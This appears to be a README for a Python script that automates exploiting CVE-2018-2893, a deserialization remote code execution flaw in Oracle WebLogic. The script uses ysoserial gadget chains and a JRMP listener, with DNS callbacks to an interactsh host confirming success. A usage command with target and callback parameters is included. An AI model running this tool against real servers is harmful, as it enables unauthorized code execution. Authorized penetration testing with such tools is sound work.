# CVE-2018-2893 WebLogic Exploit Automation Script

This Python script automates the exploitation of **CVE-2018-2893**, a remote code execution (RCE) vulnerability in Oracle WebLogic Server, by leveraging the **T3** protocol and multiple deserialization gadget chains via [ysoserial](https://github.com/frohoff/ysoserial). 

It helps identify which gadget chains are effective against a given WebLogic target by using **JRMPClient-based callback detection**. The script waits for the vulnerable server to make an outbound JRMP connection, which then triggers a **`curl` to a DNS server** (e.g., Interactsh or Burp Collaborator). This DNS callback confirms which gadget was successfully deserialized.

---

## 📌 Features

- Automates the ysoserial payload generation and JRMP listener setup
- Supports multiple gadgets to maximize coverage
- Uses DNS callback to detect successful gadget execution
- Compatible with [`interactsh-client`](https://github.com/projectdiscovery/interactsh) for DNS logging

---

## 🛠️ Requirements

- Python 3.x
- **Java 1.8** (required for ysoserial to run correctly)
- `ysoserial.jar` in the same directory or specify the path
- Optional: `interactsh-client` for generating DNS callback subdomains

> 💡 On macOS, if you have multiple versions of Java installed, you can explicitly set Java 1.8 with:
>
> ```bash
> export JAVA_HOME=$(/usr/libexec/java_home -v 1.8)
> ```

---

## ⚙️ Usage

```bash
python3 CVE-2018-2893.py \
  --listen-ip 192.168.8.113 \
  --target-ip 127.0.0.1 \
  --target-port 7001 \
  --dns-callback d21ghev8sl1q7h62q4ng66rq8wsw7m1e8.oast.me

